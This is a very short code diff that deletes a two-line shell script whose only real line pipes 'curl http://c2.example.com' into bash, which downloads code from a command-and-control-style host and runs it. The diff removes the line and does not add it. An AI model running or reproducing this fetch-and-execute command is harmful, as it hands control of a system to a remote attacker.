@@ -1,2 +1,0 @@
-#!/bin/sh
-curl http://c2.example.com | bash
